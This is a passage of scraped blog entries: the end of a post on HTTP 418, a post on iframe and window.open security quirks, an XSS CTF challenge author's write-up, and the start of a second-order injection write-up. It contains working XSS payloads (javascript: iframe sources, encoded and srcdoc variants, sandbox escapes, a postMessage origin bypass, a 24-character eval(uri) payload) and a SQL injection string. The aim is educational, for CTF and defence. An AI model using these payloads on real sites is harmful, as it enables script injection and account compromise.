circumstances require its use (e.g., exhaustion of 4NN status codes), it can be re-assigned to another use. It seems that 418 is being reserved for future use, but if the 4XX status codes are exhausted, 418 can be reassigned for another use. The latest HTTP&#x2F;1.1 standard can also be found on the httpwg website: Hypertext Transfer Protocol (HTTP&#x2F;1.1): Semantics and Content, which does not include 418. Therefore, my guess is that 418 has been added to the latest draft and reserved, but it has not been officially published yet (there are probably many processes behind it, which requires studying the HTTP Working Group’s regulations), but it should be visible in the future when the draft is published and becomes an official standard. ConclusionFrom what we have seen, 418 I am a teapot is still not part of the HTTP standard. After all, some people may think that as long as 418 I am a teapot becomes part of the HTTP standard, the problem will be solved, but I guess there are some issues with doing so (if anyone knows what the issues are, please let me know, thanks). The final conclusion should be that the 418 status code will continue to exist as I am a teapot in various mainstream HTTP implementations, but it is still not part of the HTTP standard. In the standard, the 418 status code is set to (Unused) and is temporarily reserved and will not be replaced by other uses. The main purpose of this article is to record the past and present of the 418 status code and let everyone know that it is not part of the HTTP standard. In addition, during the research process, many problems that developers may encounter were also considered, and the core concepts behind them are actually similar. Actually, I hesitated for a long time when writing this article because I was afraid that I might make a mistake somewhere (there are too many and too rich reference materials), but I remembered a sentence I saw somewhere before: “Instead of asking a question, there is a faster way to get the right answer. That is to tell a wrong answer, and someone will correct you.” Further reading: HN discussion HN discussion - 2","link":"/2019/06/14/en/http-status-code-418-teapot/"},{"title":"iframe and window.open black magic","text":"If you want to generate a new window on a webpage, there are probably only two options: one is to embed resources on the same page using tags such as iframe, embed, and object, and the other is to use window.open to open a new window. As a front-end developer, I believe that everyone is familiar with these. You may have used iframe to embed third-party web pages or widgets, or used window.open to open a new window and communicate with the original window through window.opener. However, from a security perspective, there are many interesting things about iframes, which often appear in the real world or in CTF competitions. Therefore, I want to record some of the features I learned recently through this article. Basic iframeLet’s take a look at the basic use of iframes. You can use the &lt;iframe&gt; tag to bring other people’s web pages into your own: &lt;iframe src=\"https://blog.huli.tw\">&lt;/iframe> But if you think about it carefully, if your web page can be embedded by anyone, there may be a risk of clickjacking. Therefore, if you don’t want your web page to be embedded or want to set only specific origins that can be embedded, you can use Content-Security-Policy and X-Frame-Options. I have mentioned these in What is Clickjacking, so I won’t go into detail here. Some websites that allow posting or commenting usually open up a certain degree of HTML elements and do not completely block them. For example, at least harmless elements such as bold (&lt;b&gt;) and italic (&lt;i&gt;) will be opened, and some websites will also support the iframe tag to support functions such as YouTube players. Better websites will restrict you to only enter the ID of the YouTube video and concatenate the YouTube prefix on the front end to ensure that the src loaded by the iframe comes from YouTube. Some websites may want to embed too many sites and want to provide users with more freedom, so they can allow users to customize the content of the iframe src and put whatever they want. What are the risks if the attacker can control the iframe src? The first and most easily thought of risk is that you can directly embed a phishing website in it. For example, write a page for logging in again or receiving prizes, and someone may actually enter their account password and submit the form. However, the impact of this is limited, and it involves a bit of social engineering. In fact, there is a simpler and more violent way, like this: &lt;iframe src=\"javascript:alert(1)\">&lt;/iframe> Yes, the src of the iframe can be in the format of javascript: at the beginning, and JavaScript code can be executed directly to achieve XSS. By the way, the action of &lt;form&gt; and the href of &lt;a&gt; can also be placed. I mentioned this in Learn Frontend from Security POV. Moreover, the things in HTML attributes can be encoded, and there are three ways to encode them, using the &amp; character as an example: Encode with names, such as &amp;amp; (not every character is supported, there is a list here: https://dev.w3.org/html5/html-author/charref) Encode with decimal, such as &amp;#38; Encode with hexadecimal, such as &amp;#x26; So every character in javascript:alert(1) can be freely replaced with these encodings, for example: &lt;iframe src=\"&amp;#x6a;&amp;#65;vAScrIpt&amp;colon;alert&amp;lpar;1&amp;rpar;\">&lt;/iframe> (If you want to play with encoding and decoding, you can go to this website: https://mothereff.in/html-entities) In addition to javascript:, you can also use data: to load any web page: &lt;iframe src=\"data:text/html,&lt;h1>hello&lt;/h1>\">&lt;/iframe> You can also specify base64 encoding: &lt;iframe src=\"data:text/html;base64,PGgxPmhlbGxvPC9oMT4=\">&lt;/iframe> However, the above two methods are not very useful because if the src uses data URI, the origin will become &quot;null&quot;, which is different from the original page and cannot access the data on the page. So as the defending party, what can we do? We can restrict the beginning to be http:// or https://, which can block unexpected schemes. However, if only this is done, there is another potential risk, which is open redirect. The embedded page can use top.location = &quot;https://huli.tw&quot; to redirect the top-level page to anywhere. Usually, cross-origin operations are prohibited, and errors will be thrown when accessing properties on the window: Uncaught DOMException: Blocked a frame with origin “null” from accessing a cross-origin frame. But there are a few exceptions, which can be found in the HTML spec’s 7.2.3.1 CrossOriginProperties ( O ): If O is a Location object, then return « { [[Property]]: “href”, [[NeedsGet]]: false, [[NeedsSet]]: true }, { [[Property]]: “replace” } ». A JavaScript property name P is a cross-origin accessible window property name if it is “window”, “self”, “location”, “close”, “closed”, “focus”, “blur”, “frames”, “length”, “top”, “opener”, “parent”, “postMessage”, or an array index property name. Some are callable functions, such as focus, blur, and postMessage, which can be called across origins, and postMessage is also the primary way to pass information between windows across origins. Most of the others are readable properties, such as closes, frames, length, top, opener, and parent. The few writable properties are location.href, which can be used to redirect the webpage to another location using location.href = &#39;https://huli.tw&#39; as long as you can access the window. By the way, there is another way to execute JavaScript through the location + javascript protocol, like this: location.href = &#39;javascript:alert(1)&#39;, which I mentioned in What is Open Redirect . At this point, you may wonder if the iframe src + data URI mentioned earlier can bypass the null origin restriction and perform XSS on the parent window using this method? Like this: &lt;iframe src=\"data:text/html,&lt;script>top.location.href = 'javascript:alert(1)'&lt;/script>\">&lt;/iframe> The answer is no, the browser will give you this error: Unsafe attempt to initiate navigation for frame with URL ‘file:&#x2F;&#x2F;poc.html’ from frame with URL ‘data:text&#x2F;html,&lt;script&gt;top.location.href &#x3D; ‘javascript:alert(1)’‘. The frame attempting navigation must be same-origin with the target if navigating to a javascript: url If you want to jump to a URL starting with javascript:, it must be same-origin to allow you to jump. iframe’s srcdocIn addition to the commonly used src attribute, there is another attribute called srcdoc, which contains the content of the iframe. It is similar to src + data URI: &lt;iframe srcdoc=\"&lt;h1>hello&lt;/h1>&lt;script>alert(top.document.body)&lt;/script>\"> &lt;/iframe> But there is a decisive difference, that is, the window generated by iframe + srcdoc will inherit the origin of the upper layer, which is different from the null origin of data URI. That is to say, the above code can access the upper layer’s DOM elements because they are same origin. In addition, srcdoc is not affected by the frame-src of CSP. Just like iframe’s src, if it is javascript:, it is controlled by script-src instead of frame-src. For details, please refer to Test of CSP: iframe srcdoc&#x3D;’…’ is not governed by frame-src. Also, because srcdoc is an HTML attribute, the content is the same as mentioned before, it can be an encoded result, like this: &lt;iframe srcdoc=\"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\">&lt;/iframe> Therefore, if the attribute of iframe srcdoc is controllable, even if the content has been escaped, it is useless and will still be parsed back to the original symbol for execution. iframe’s CSPThere is a csp attribute on the iframe, which can specify the CSP rules for the document loaded by the iframe, but not every browser supports it. Please refer to MDN: HTMLIFrameElement.csp: &lt;iframe csp=\"default-src 'self'; script-src 'none';\" srcdoc=\"&lt;script>alert(1)&lt;/script>\">&lt;/iframe> After adding the csp attribute, the content of the iframe will be affected by it. For example, opening test.html directly will pop up an alert, but using csp to block inline scripts will pop up an error message violating CSP: // test.html &lt;script>alert(1)&lt;/script> // csp.html &lt;iframe csp=\"default-src 'self'; script-src 'none';\" src=\"test.html\">&lt;/iframe> Refused to execute inline script because it violates the following Content Security Policy directive: “script-src ‘none’”. Either the ‘unsafe-inline’ keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI&#x3D;’), or a nonce (‘nonce-…’) is required to enable inline execution. In a previous Intigriti XSS challenge, CSP was inserted to make the CSP stricter, and some scripts would not be executed, relying on this to bypass some restrictions. iframe’s sandboxAs mentioned earlier, when you use an iframe to embed other web pages, that web page can use top.location = &#39;https://huli.tw&#39; to redirect the upper page to another place. The iframe has an attribute called sandbox, which can restrict various behaviors of the iframe and prevent it from doing some bad things. The basic usage is like this: &lt;iframe srcdoc=\"&lt;script>alert(1)&lt;/script>\" sandbox>&lt;/iframe> Blocked script execution in ‘about:srcdoc’ because the document’s frame is sandboxed and the ‘allow-scripts’ permission is not set. Once the sandbox attribute is added, it enters sandbox mode. There are two main differences with or without it. The first is that the origin of the loaded iframe becomes null. The second is that a lot of functions will be turned off, and these functions can be actively turned on. According to the latest spec, there are a total of 13 flags, each representing a function: allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols Here, there are quite a few flags, and some of them are very similar. Let’s start with the most important one, allow-scripts. This flag is easy to understand. If it is not added, JavaScript cannot be executed, as seen in the error above. After adding this flag, JavaScript can be executed, but there are still limitations on the available functions. We can categorize the other flags into several types for better understanding. Flags related to redirectionThe following three flags are related to redirection: allow-top-navigation allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols If not added, the default is that the upper layer cannot be redirected: &lt;iframe srcdoc=\"&lt;script>top.location='https://blog.huli.tw'&lt;/script>\" sandbox=\"allow-scripts\"> &lt;/iframe> Error: Unsafe attempt to initiate navigation for frame with URL ‘file:&#x2F;&#x2F;&#x2F;test.html’ from frame with URL ‘about:srcdoc’. The frame attempting navigation of the top-level window is sandboxed, but the flag of ‘allow-top-navigation’ or ‘allow-top-navigation-by-user-activation’ is not set. To allow the iframe to redirect to the upper layer, simply add allow-top-navigation. However, if you don’t want the webpage to be automatically redirected without interaction, you can use the allow-top-navigation-by-user-activation flag: &lt;iframe srcdoc=\"&lt;script>top.location='https://blog.huli.tw'&lt;/script>\" sandbox=\"allow-scripts allow-top-navigation-by-user-activation\"> &lt;/iframe> Error: The frame attempting navigation of the top-level window is sandboxed with the ‘allow-top-navigation-by-user-activation’ flag, but has no user activation (aka gesture). See https://www.chromestatus.com/feature/5629582019395584. With this flag, the user must have interaction (such as clicking a button to trigger an event) to redirect the webpage. As for the allow-top-navigation-to-custom-protocols flag, it is not supported by Chrome at the moment, so it cannot be demoed. The flags supported by Chrome 102 can be found here: third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;html&#x2F;html_iframe_element_sandbox.cc Flags related to functions allow-downloads allow-forms allow-orientation-lock allow-pointer-lock allow-presentation The above five flags are related to functions, and you can roughly tell what they are for from their names. For example, by default, forms cannot be submitted: &lt;iframe srcdoc=\"&lt;form>&lt;input name=a value=a>&lt;input type=submit>&lt;/form>\" sandbox> &lt;/iframe> Error: Blocked form submission to ‘’ because the form’s frame is sandboxed and the ‘allow-forms’ permission is not set. You need to add the allow-forms flag before submitting the form. Other flags are similar, but we won’t go into detail here. Flags related to pop-up windows allow-modals allow-popups allow-popups-to-escape-sandbox allow-modals and allow-popups have similar names, but their definitions are quite different. The following functions are opened by allow-modals: window.alert window.confirm window.print window.prompt beforeunload event Here’s a simple example: &lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; sandbox=&quot;allow-scripts&quot;&gt;, with the error message: Ignored call to ‘alert()’. The document is sandboxed, and the ‘allow-modals’ keyword is not set. allow-popups is related to window.open and target=_blank. By default, you cannot open a new window: &lt;iframe srcdoc=\"&lt;script>window.open()&lt;/script>\" sandbox=\"allow-scripts\"> &lt;/iframe> Error message: Blocked opening ‘’ in a new window because the request was made in a sandboxed frame whose ‘allow-popups’ permission is not set. You need to add allow-popups to use window.open. There’s also a magical feature here. I think the old spec explains it better: While the sandbox attribute is specified, the iframe element’s nested browsing context must have the flags given in the following list set. In addition, any browsing contexts nested within an iframe, either directly or indirectly, must have all the flags set on them as were set on the iframe’s Document’s browsing context when the iframe’s Document was created. The new spec removes that section and puts it somewhere else, but the meaning is the same: the window opened by the sandboxed iframe inherits the sandbox properties! What does this mean? For example, if I have an iframe.html with only this content: &lt;script&gt;alert(1)&lt;/script&gt;, and then I write this in another page test.html: &lt;iframe srcdoc=\"&lt;script>window.open('iframe.html')&lt;/script>\" sandbox=\"allow-scripts allow-popups\"> &lt;/iframe> You will find that the newly opened iframe.html page cannot execute alert(1) because it inherits the sandbox, and the sandbox does not have the allow-modals property. Another example: we can find a webpage that uses JS to render the page content on the internet, like this calculator: https://ahfarmer.github.io/calculator/ It works fine when opened directly, but if we open it with a sandboxed iframe: &lt;iframe srcdoc=\"&lt;a href='https://ahfarmer.github.io/calculator/' target=_blank>click me&lt;/a>\" sandbox=\"allow-popups\"> &lt;/iframe> You will see that the screen turns black, and if you open DevTools, you will see the error: Blocked script execution in ‘https://ahfarmer.github.io/calculator/‘ because the document’s frame is sandboxed and the ‘allow-scripts’ permission is not set. This verifies what we said above, that windows opened from sandboxed iframes will inherit the sandbox properties. In addition, there’s another feature: do you remember that the origin in the sandbox becomes null? Because of inheritance, the origin of the page opened with window.open will also become null. What does this mean? It means that we can use a sandbox iframe + window.open to achieve: Disable certain functions of any page Let the origin of any page become null As mentioned earlier, two different windows can exchange messages through postMessage, and when listening for messages, event.origin is checked to confirm whether it is legal: window.onmessage = function(event) &#123; if (event.origin !== 'https://example.com') return &#125; However, some web pages will check like this: window.onmessage = function(event) &#123; if (event.origin !== window.origin) return &#125; At this point, we can use the technique mentioned above to bypass the check, open the page with a sandbox iframe, and make its origin become &quot;null&quot;. Then we can use the window of the sandbox iframe itself to postMessage, so that event.origin is also &quot;null&quot;, thereby making the condition true. However, although doing so can bypass the check, even if XSS is obtained later, the things that can be done are still limited because the origin is &quot;null&quot;, so localStorage and cookies cannot be accessed. There is a soXSS challenge that uses this trick to solve it. If you don’t want the newly opened window to inherit the sandbox attribute, you can add allow-popups-to-escape-sandbox, so that the newly opened window will jump out of the sandbox: &lt;iframe srcdoc=\"&lt;a href='https://ahfarmer.github.io/calculator/' target=_blank>click me&lt;/a>\" sandbox=\"allow-popups allow-popups-to-escape-sandbox\"> &lt;/iframe> There was a problem that occurred before, that is, since allow-popups-to-escape-sandbox can jump out of the sandbox, it can be combined with javascript: to execute code, like this: &lt;iframe sandbox=\"allow-modals allow-popups allow-popups-to-escape-sandbox\" srcdoc=\"&lt;a target='_blank' href='javascript:window.opener.eval(`alert(location.href)`)'>click me&lt;/a>\"> &lt;/iframe> Details can be found in Issue 1014371: Security: iframe sandbox can be worked around via javascript: links and window.opener and Gate javascript: navigation on sandboxing flags. #5083 and the original commit. Finally, let me also mention another thing similar to window.origin: location.origin, which is purely determined by the location to determine the origin, which is different from window.origin. According to the specification: Developers are strongly encouraged to use self.origin over location.origin. The former returns the origin of the environment, the latter of the URL of the environment. Imagine the following script executing in a document on https://stargate.example/: Then an example is given below to illustrate that window.origin is more reliable than location.origin: var frame = document.createElement(\"iframe\") frame.onload = function() &#123; var frameWin = frame.contentWindow console.log(frameWin.location.origin) // \"null\" console.log(frameWin.origin) // \"https://stargate.example\" &#125; document.body.appendChild(frame) But I think it still depends on the situation. allow-same-originFinally, we come to the last flag of the sandbox. As mentioned earlier, once the sandbox is added, the origin will become &quot;null&quot;, and even if JavaScript can be executed, cookies or localStorage cannot be obtained, which is actually very limited. If you want to break through this limitation, you must add allow-same-origin. I used to be very confused about this flag and thought, “Does adding this flag make the iframe and parent window become the same origin?” But in my understanding, this flag is more like: “Keep the original origin”. Below is a direct quote from the specification’s precise description: The allow-same-origin keyword causes the content to be treated as being from its real origin instead of forcing it into a unique origin. Take the following paragraph as an example, assuming that the URL of this page is: http://localhost:3000 &lt;iframe sandbox=\"allow-same-origin allow-scripts allow-modals\" srcdoc=\"&lt;script>alert(window.origin)&lt;/script>\">&lt;/iframe> If allow-same-origin is not added, it will display &quot;null&quot;. However, if allow-same-origin is added, it will display http://localhost:3000 as the original origin is preserved. In addition, the specification also specifically warns that if you embed a same-origin webpage in an iframe and set allow-same-origin allow-scripts in the sandbox, the webpage in the iframe can remove the sandbox by itself, making it the same as with or without the sandbox, like this: &lt;iframe sandbox=\"allow-same-origin allow-scripts\" srcdoc=\"&lt;script>top.document.querySelector('iframe').removeAttribute('sandbox');location.reload();alert(1)&lt;/script>\"> &lt;/iframe> Summary of iframesI believe that for most developers, the following attributes should still be quite unfamiliar: srcdoc csp sandbox Only those who have used or dealt with related requirements may know about these things. For CTF, there are several features that I have seen or may be exploited: Put javascript: in src to directly perform XSS Add csp to the embedded page to block some function executions Use the feature of the srcdoc attribute to put in an already escaped string, which will be restored to its original content at this time Use the inheritance feature of sandbox + window.open to achieve “even if you cannot embed content with iframe, you can still change window.origin“ window.openAfter talking about iframes, let’s continue to look at the window.open method, which has three optional parameters: window.open(url, name, features), and it will return the opened window, and you can postMessage to this new window: var win = window.open('https://blog.huli.tw', 'huliblog') // 要先等 window 載入好 setTimeout(() => &#123; win.postMessage(\"hello\", '*') &#125;, 2000) The newly opened window can be accessed by window.opener. I mentioned this feature before in Starting a spec journey from SessionStorage. Then, the second parameter passed to window.open will be the name of this new window. For example, if I execute console.log(window.name) in the newly opened window, it will print huliblog. This window.name is actually a very interesting feature. Usually, when we open a new link, we will do this: &lt;a href=&quot;https://example.com&quot; target=&quot;_blank&quot;&gt;open&lt;/a&gt;, using target=_blank to open a new window. However, this target can also be a string, and this string will be the name of the new window, like this: &lt;a href=\"https://example.com\" target=\"example\"> open &lt;/a> If you open the console in this new window and log window.name, you will see the name we set, example. What if this named window already exists? Let’s try it out: &lt;a href=\"https://blog.huli.tw\" target=\"blog\">open link&lt;/a> &lt;button onclick=\"window.open('https://example.org/','blog')\">open window&lt;/button> Clicking on &lt;a&gt; will open a window named blog and redirect to my blog. Clicking the button will open a new window to another webpage, and the name is also blog. You can try clicking the link first and then the button, or vice versa. In any case, the result is similar. When opening a new window, it will first check if there is a window with the same name. If there is, it will not open a new one, but will directly use that one. Therefore, in the example above, if you click the button to open a blog window first, and then click the link, it will not open a new window, but will only redirect the original window to the URL in href. Apart from the target attribute of &lt;a&gt;, the target attribute of &lt;form&gt; can also specify the window name. The term used in the specification is “Valid browsing context name or keyword”, and the keywords are the four well-known ones: _blank, _self, _parent, or _top. According to the specification 7.1.5 Browsing context names, any string with at least one character that does not start with a U+005F LOW LINE character is a valid browsing context name. (Names starting with an underscore are reserved for special keywords.) Generating named windows and obtaining window referencesThere are several ways to generate named windows: &lt;a target=&quot;&quot;&gt; &lt;form target=&quot;&quot;&gt; &lt;iframe name=&quot;&quot;&gt; &lt;object name=&quot;&quot;&gt; &lt;embed name=&quot;&quot;&gt; window.open(url, name) For the last four, you can directly obtain the reference of the opened window, like this: &lt;iframe name=\"w1\" src=\"https://blog.huli.tw\">&lt;/iframe> &lt;object name=\"w2\" data=\"https://blog.huli.tw\">&lt;/object> &lt;embed name=\"w3\" src=\"https://blog.huli.tw\">&lt;/embed> &lt;script> var w4 = window.open('https://blog.huli.tw') setTimeout(() => &#123; console.log('w1', w1) console.log('w2', w2) console.log('w3', w3) console.log('w4', w4) &#125;, 2000) &lt;/script> What about the first two? You can use the feature of window.open to obtain the window reference if the name already exists, like this: &lt;a target=\"blog\" href=\"https://blog.huli.tw\">open&lt;/a> &lt;button onclick=\"run()\">get blog window&lt;/button> &lt;script> function run() &#123; var blog = window.open('https://blog.huli.tw#abc', 'blog') console.log(blog) &#125; &lt;/script> First, click “open” to open a new window, and then click the button. At this point, we use window.open(&#39;https://blog.huli.tw#abc&#39;, &#39;blog&#39;) to open a window with the same name. According to the specification: Opens a window to show url (defaults to “about:blank”), and returns it. target (defaults to “_blank”) gives the name of the new window. If a window already exists with that name, it is reused. Because there is a window with the same name, it will be reused. And we just added #, so it won’t redirect. Although the focus will jump to the newly opened window, we can obtain the reference of the window opened with &lt;a target&gt; by this method (there is another way that won’t jump, which is to give a non-existent scheme, like xxxx://test). In addition, this named window should only be useful in the same browsing context. In other words, if I open two web pages A.html and B.html, open a window named “blog” in A.html, and then execute window.open(&#39;&#39;, &#39;blog&#39;) in B.html, I will not get the blog window opened in A.html, but will open a new one because A and B are in different browsing contexts. But the situation is different when switching pages. It’s quite interesting. Suppose I’m now at http://localhost:5555/A.html and I’ve opened a window named “blog”, and then I navigate to http://localhost:5555/B.html: &lt;button onclick=\"run()\">run&lt;/button> &lt;script> function run() &#123; window.open('https://blog.huli.tw', 'blog') location = 'http://localhost:5555/B.html' &#125; &lt;/script> Then I also open a window with the same name in B.html: window.open(&#39;&#39;, &#39;blog&#39;). At this point, I will get the blog window opened in A.html, not a new one. Also, if I redirect from B.html to https://blog.huli.tw, and then execute window.open(&#39;&#39;, &#39;blog&#39;) in the console, I can still get the blog window opened in A.html. But if I redirect to https://example.org, a new tab will be opened and I won’t get the blog window. It seems that if the same page jumps to a page with the same origin as the opener or the opened window, it will be the same browsing context. This feature is quite interesting (it’s time to study browsing context). Utilizing window.nameSometimes, XSS is limited by length, for example, if the username has an XSS vulnerability, but only 32 characters can be used, we would want our payload to be as short as possible. To achieve this, we need to use other information to bring in the actual code we want to execute to control the length. For example, you can put the code you want to execute after the # in the URL, and then write the payload as eval(location.hash.slice(1)). window.name is a commonly used technique. We can set window.name on page A and then redirect to page B. At this point, the window.name of page B will be what we just set: name = 'hello, world!' location = 'https://example.org' However, this trick only works on Chromium-based browsers (Chrome and Edge) because according to the specification, if the page being redirected to is not the same origin, the name should be cleared. Chromium has a bug related to this: Issue 706350: Clear browsing context name on cross site navigation or history traversal, which has not been fixed since 2017. It was once fixed but caused other bugs, so it was reverted. Safari was the first to implement this, and in January 2021, FireFox also implemented it, making Chromium an outlier. There is a great webpage that shows the testing status of each browser: https://wpt.fyi/results/html/browsers/windows/clear-window-name.https.html?label=master&amp;label=experimental&amp;aligned Detecting when a new window has finished loadingAn iframe has an onload event that can be used to determine when it has finished loading. However, when using window.open to open a new window, there is no event to listen to (unless it is the same origin), so you don’t know when it will finish loading. But it’s okay. If you open a cross-origin webpage, you can use the fact that accessing window.origin or other properties will cause an error to implement a simple polling mechanism: var start = new Date() var win = window.open('https://blog.huli.tw') run() function run() &#123; try &#123; win.origin setTimeout(run, 60) &#125; catch(err) &#123; console.log('loaded', (new Date() - start), 'ms') &#125; &#125; When the webpage has not finished loading, win.origin will be itself. It will only become the opened webpage after it has finished loading. Therefore, accessing win.origin after it has finished loading will cause an error due to cross-origin issues and be caught. Detecting whether a window with a certain name existsIs there a way to detect whether a window with a certain name exists? As mentioned earlier, if a named window is opened and a window with the same name already exists, it will not open a new window but will redirect to the existing one. We can use this difference to detect whether a window with a certain name exists, and we can also use the iframe sandbox mentioned earlier to prevent opening new windows. The concept above is from Easter XSS by @terjanq, with some slight modifications to the code, only targeting Chrome: &lt;body> &lt;a href=\"https://blog.huli.tw\" target=\"blog\">click&lt;/a> &lt;button onclick=\"run()\">run&lt;/button> &lt;iframe name=f sandbox=\"allow-scripts allow-same-origin allow-popups-to-escape-sandbox allow-top-navigation\"> &lt;/iframe> &lt;script> function run()&#123; var w = f.open('xxx://abcde', 'blog') if (w) &#123; console.log('blog window exists') &#125; else &#123; console.log('blog window not exists') &#125; &#125; &lt;/script> &lt;/body> ConclusionThis article briefly describes some interesting features of iframes and windows, but some things are still not thoroughly researched, such as the related terms of browsing context and how to determine whether they are under the same browsing context. These will have to be absorbed slowly by reading the spec. References: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox https://cloud.google.com/blog/products/data-analytics/iframe-sandbox-tutorial https://www.w3.org/TR/2010/WD-html5-20100624/the-iframe-element.html https://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/ https://googlechrome.github.io/samples/allow-popups-to-escape-sandbox/ https://xsleaks.dev/","link":"/2022/04/07/en/iframe-and-window-open/"},{"title":"Intigriti 0222 XSS Challenge Author Writeup","text":"In May 2021, I solved my first Intigriti XSS challenge. Since then, I play every XSS challenge afterward, and solved most of them. Sometimes it’s painful when you try everything you know but still can’t solve it, however, the moment you made it, the pain is gone, replaced with joy and happiness. As a player, I want to be on the other end(as a challenge maker) at least once, if I have an idea of an interesting XSS challenge. I talked to @PinkDraconian in Jan 2021 and share an XSS challenge I created, after a few discussions, it gets accepted. This write-up is about the story behind the challenge. Where the story beginsOne day, when I was studying the famous Tiny XSS Payloads website, I noticed a payload: &lt;svg/onload=eval(`'`+URL)> My question is: “Why do we need a quote before the URL?” If we can control the URL, we can make it something like this: https://example.com/#&#39;;alert(1). After adding a quote before the URL, it becomes &#39;https://example.com/#&#39;;alert(1), just a string and a function call. I realized that the quote is to make the URL a valid JavaScript snippet. When I pasted the URL on the code editor, I noticed another interesting thing: The part after // is grey out, because // means comment in JavaScript. Moreover, https: is also a valid syntax in JavaScript because it’s a “label”, what a coincidence! Unlike other languages like C, JavaScript has no goto statement. But, you can still use the label with break and continue, it’s useful when you have nested for-loop: // without label, you need to have a flag to break outer loop let isOver = false for(let i=0; i&lt;5; i++) &#123; console.log(i) for(let j=0; j&lt;5; j++) &#123; if (i*j === 9) &#123; isOver = true break &#125; &#125; if (isOver) break &#125; // with label, it's easier outer: for(let i=0; i&lt;5; i++) &#123; console.log(i) for(let j=0; j&lt;5; j++) &#123; if (i*j === 9) &#123; break outer &#125; &#125; &#125; So, https://example.com is a valid JavaScript code, it’s composed of labels and comments, cool, isn’t it? That is to say, https://example.com\\nalert(1) is also valid and will pop up an alert! After I found this, I was thinking that maybe I can make it an XSS challenge. Then I do. Let’s talk about the challengeThe core of the challenge is the following code: window.name = 'XSS(eXtreme Short Scripting) Game' function showModal(title, content) &#123; var titleDOM = document.querySelector('#main-modal h3') var contentDOM = document.querySelector('#main-modal p') titleDOM.innerHTML = title contentDOM.innerHTML = content // DOM-XSS here window['main-modal'].classList.remove('hide') &#125; if (location.href.includes('q=')) &#123; var uri = decodeURIComponent(location.href) var qs = uri.split('&amp;first=')[0].split('?q=')[1] if (qs.length > 24) &#123; showModal('Error!', \"Length exceeds 24, keep it short!\") &#125; else &#123; showModal('Welcome back!', qs) &#125; &#125; I hope it looks normal, like what a normal developer will do. It’s just extracting the query string q and checking its length, then putting it into HTML. The challenge here is the length limit, you can only insert HTML with no more than 24 characters. The shortest payload on TinyXSS is &lt;svg/onload=eval(name)&gt; which is 23 in length, but it doesn’t work because of this line: window.name = &#39;XSS(eXtreme Short Scripting) Game&#39;, it prevents the payload from window.name. How about &lt;script/src=//Ǌ.₨&gt;&lt;/script&gt;? I saw so many people were trying this way, but it won’t work even if there is no length limitation, because a &lt;script&gt; tag inserted with innerHTML should not execute. All other payloads exceed 24 characters, including what I have mentioned previously: &lt;svg/onload=eval(&quot;&#39;&quot;+URL)&gt; If you remember what I wrote at the beginning, you may try this payload as well: &lt;svg/onload=eval(URL)&gt; with the URL: https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Csvg/onload=eval(URL)%3E&amp;first=1#%0aalert(1) Unfortunately, this doesn’t work, because the URL is encoded, it’s %0a instead of a newline character. It seems a dead-end, unless you look at the code again carefully. Reuse the existing thingIf you check the scope in devtool or print all properties of window, you should find a variable called uri. Let’s look at the code again: if (location.href.includes('q=')) &#123; var uri = decodeURIComponent(location.href) var qs = uri.split('&amp;first=')[0].split('?q=')[1] if (qs.length > 24) &#123; showModal('Error!', \"Length exceeds 24, keep it short!\") &#125; else &#123; showModal('Welcome back!', qs) &#125; &#125; Although the variable uri is declared inside the if block, it’s still a global variable because var is function-scoped or globally scoped, not block-scoped. Is this variable helpful? Absolutely. uri is a decoded URL, our %0a turns into \\n, a new line character! So, just replace the payload from eval(URL) to eval(uri), the payload works now: https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Csvg/onload=eval(uri)%3E&amp;first=1#%0aalert(1) We have to fix one last thing: it doesn’t work on Firefox. it’s not hard to find out that &lt;style&gt; can be used instead of &lt;svg&gt;, here is the final payload: https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&amp;first=1#%0aalert(document.domain) The length is 24 characters, perfectly fits the limitation. By the way, if %0a is blocked, try U+2028(%E2%80%A8) and U+2029(%E2%80%A9) instead, it’s also line terminators. I learned this trick from 0621 XSS challenge. Other invalid but interesting solutionsI have another solution but with user interaction: https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cq%20oncut=eval(%22%27%22+URL)%3E1&amp;first=1#&#39;;alert(1) &lt;q/oncut=eval(\"'\"+URL)>1 One needs to focus on the &lt;q&gt; element and press ctrl+x to trigger the XSS. If you have other solutions, feel free to DM me(@aszx87410). Closing ThoughtsThanks for playing the challenge I created, I hope all of you have fun and enjoy it. There is another great article that has mentioned the same technique: Smuggling Script via URL: Short HTML-based XSS payload, I haven’t seen this until a player who solved the challenge sent me this via DM. I should have added a new line filter to make it harder, at least not so easy to find the answer lol","link":"/2022/02/14/en/intigriti-0222-author-writeup/"},{"title":"Intigriti 0123 Challenge Writeup - Second Order MongoDB JS Injection","text":"As usual, there is a Intigriti challenge in January, but this time it’s not an XSS challenge. It’s about “second order injection” which is relatively uncommon, so I decided to write a blog post. The challengehttps://challenge-0123.intigriti.io/challenge.html There are only 3 simple features: register and login change email search user The goal is to find the flag, which is the password of one special user, the format is INTIGRITI&#123;.*&#125; At first, I have totally no idea what is this challenge about. I tried SQL injection to search user, but finds nothing. Later on I found that we can use login page to create a new user(just like register), but that’s all, I still don’t know what to do. Luckily, I saw two hints from the official twitter, the first one is about a fruit, the second one is about “SECOND”. When I saw the word “SECOND”, I recalled a type of vulnerability called “second order SQL injection”. What is second order SQL injection?Assumed there is a website, you can register and login, and the website escaped your input properly, so there is no SQL injection in both register and login feature. But, after you logged in and visit home page, it calls somehting like this in backe-end: select * from users where username = 'YOUR_USERNAME' They forgot to encode the username here, so here is vulnerable to SQL injection. So, you can create a user with username &#39; or &#39;1&#39;=&#39;1, then visit home page, the following SQL query will be execute: select * from users where username = '' or '1'='1' You input your SQL injection payload at one place, and got executed at another place, that is called second order SQL injection. But, how to apply this technique to the challenge? Keep tryingAt first, I tried to insert my SQL injection payload to the username, and then search this user 